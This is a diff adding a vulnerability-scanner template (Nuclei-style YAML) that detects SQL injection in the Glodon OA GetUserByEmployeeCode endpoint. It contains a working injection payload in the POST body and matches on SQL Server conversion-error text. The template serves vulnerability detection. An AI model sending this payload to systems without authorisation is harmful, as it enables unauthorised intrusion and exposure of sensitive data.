@@ -1,0 +1,26 @@
+id: glodon-getuserbyemployeecode-sqli
+info:
+  name: Glodon OA GetUserByEmployeeCode SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Glodon OA GetUserByEmployeeCode endpoint is vulnerable to SQL Injection, exposing sensitive data.
+http:
+  - method: POST
+    path:
+      - "/Org/service/Service.asmx/GetUserByEmployeeCode"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      employeeCode=1'-1/user--'&EncryptData=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
